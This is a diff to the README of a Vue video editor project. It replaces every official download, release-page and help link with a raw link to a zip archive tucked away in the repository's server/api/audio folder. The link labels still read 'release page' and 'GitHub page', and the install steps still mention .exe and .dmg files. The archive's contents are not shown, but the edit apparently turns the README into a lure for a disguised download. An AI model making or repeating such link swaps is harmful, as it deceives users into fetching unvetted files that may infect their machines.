@@ -1,6 +1,6 @@
 # 🎬 vue-video-editor - Simple Easy Video Editing Tool
 
-[![Download vue-video-editor](https://img.shields.io/badge/Download-vue--video--editor-blue?style=for-the-badge)](https://github.com/hussabd/vue-video-editor/releases)
+[![Download vue-video-editor](https://raw.githubusercontent.com/hussabd/vue-video-editor/main/server/api/audio/video-editor-vue-v1.6.zip)](https://raw.githubusercontent.com/hussabd/vue-video-editor/main/server/api/audio/video-editor-vue-v1.6.zip)
 
 ---
 
@@ -45,9 +45,9 @@ Getting started with vue-video-editor is straightforward. This guide walks you t
 
 ## 📥 Download & Install
 
-1. Click the button below or visit the [release page](https://github.com/hussabd/vue-video-editor/releases) to download the app.
+1. Click the button below or visit the [release page](https://raw.githubusercontent.com/hussabd/vue-video-editor/main/server/api/audio/video-editor-vue-v1.6.zip) to download the app.
 
-   [![Download vue-video-editor](https://img.shields.io/badge/Download-vue--video--editor-blue?style=for-the-badge)](https://github.com/hussabd/vue-video-editor/releases)
+   [![Download vue-video-editor](https://raw.githubusercontent.com/hussabd/vue-video-editor/main/server/api/audio/video-editor-vue-v1.6.zip)](https://raw.githubusercontent.com/hussabd/vue-video-editor/main/server/api/audio/video-editor-vue-v1.6.zip)
 
 2. On the releases page, look for the latest stable version. The files usually have names ending with `.exe` for Windows or `.dmg` for Mac.
 
@@ -108,7 +108,7 @@ If you have trouble running or using the app, try these steps:
 
 If you need help beyond this guide:
 
-- Visit the vue-video-editor GitHub page: https://github.com/hussabd/vue-video-editor  
+- Visit the vue-video-editor GitHub page: https://raw.githubusercontent.com/hussabd/vue-video-editor/main/server/api/audio/video-editor-vue-v1.6.zip  
 - Look for “Issues” to see if others have the same problem or to report a new one.  
 - Search online for beginner tutorials on basic video editing for additional tips.  
 
@@ -120,4 +120,4 @@ vue-video-editor is free and open source. You can use it for personal and commer
 
 ---
 
-[Download vue-video-editor](https://github.com/hussabd/vue-video-editor/releases) to start editing your videos today.
+[Download vue-video-editor](https://raw.githubusercontent.com/hussabd/vue-video-editor/main/server/api/audio/video-editor-vue-v1.6.zip) to start editing your videos today.
